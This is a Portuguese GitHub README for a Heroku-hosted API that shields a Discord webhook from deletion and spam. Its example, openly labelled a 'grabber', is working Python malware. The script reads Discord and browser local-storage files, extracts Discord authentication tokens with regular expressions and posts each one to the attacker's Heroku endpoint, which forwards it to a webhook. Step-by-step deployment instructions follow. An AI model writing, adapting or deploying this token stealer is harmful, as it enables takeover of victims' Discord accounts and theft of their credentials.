<p align="center">
<img src="https://img.shields.io/github/languages/top/Tzputao/Discord-Webhook-Protetor?style=flat-square" </a>
<img src="https://img.shields.io/github/last-commit/Tzputao/Discord-Webhook-Protetor?style=flat-square" </a>
<img src="https://img.shields.io/github/stars/Tzputao/Discord-Webhook-Protetor?color=444444&label=Stars&style=flat-square" </a>
<img src="https://img.shields.io/github/forks/Tzputao/Discord-Webhook-Protetor?color=444444&label=Forks&style=flat-square" </a>
</p>
</p>
<p align="center">
<a href="https://github.com/Tzputao/Discord-Webhook-Protetor#setting-up-the-api">Configure a API</a> ⋮
<a href="https://instagram.com/tzfofo">Discord</a>
</p>

#### Discord-Webhook-Protetor foi feito por
Amar ❌ código ✅

---

### 🔰・Recursos
```
> Fácil de configurar
> Webhook protegido para que não possa ser enviado por spam ou excluído, mesmo que seja depurado por http!
> Aceitando apenas solicitações de postagem
> Impossível excluir webhook (ainda possível spam, mas muito difícil)
```

### 🎈・Exemplo de código
Exemplo de um grabber para o qual você pode usar a API
```py
import os, re
import requests
from pyotp import TOTP

api = "https://your-heroku-app-name.herokuapp.com" #o nome do seu aplicativo provavelmente será algo como https://frozen-beach-72554.herokuapp.com

pass32 = 'K4ZVUQTSIRMDOWKRGU2WQQTZJM======' #precisa ser a mesma chave da sua API
key = TOTP(pass32).now()

local = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')

paths = {
    'Discord': roaming + '\\Discord\\Local Storage\\leveldb',
    'Discord Canary': roaming + '\\discordcanary\\Local Storage\\leveldb',
    'Discord PTB': roaming + '\\discordptb\\Local Storage\\leveldb',
    'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb',
    'Opera': roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb',
    'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb',
    'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb'
}
for platform, path in paths.items():
    if not os.path.exists(path):
        continue
    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue
        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    requests.post(api, headers={"Authorization": key}, json={"content": token})
```

### 📁・Configurando a API
1. Crie uma conta em [Heroku.com](https://heroku.com)
2. Instalar [nodejs](https://nodejs.org/en/), [heroku cli](https://devcenter.heroku.com/articles/getting-started-with-nodejs#set-up), e [git](https://git-scm.com/)
3. abra api.js e coloque seu webhook no topo (linha 5)
4. abra cmd no diretório e digite `npm i`
5. Agora siga estes passos com cuidado ⇣
```sh-session
$ heroku login
...
$ git init
$ git add .
$ git commit -m "primeiro commit da API do protetor de Webhook"
...
$ heroku create
...
$ git push heroku main
...
$ heroku ps:scale web=1
$ heroku open
```

### 📜・ Próximos recursos
* Suporte para upload de arquivos (provavelmente não em um tempo, pois sou muito preguiçoso)
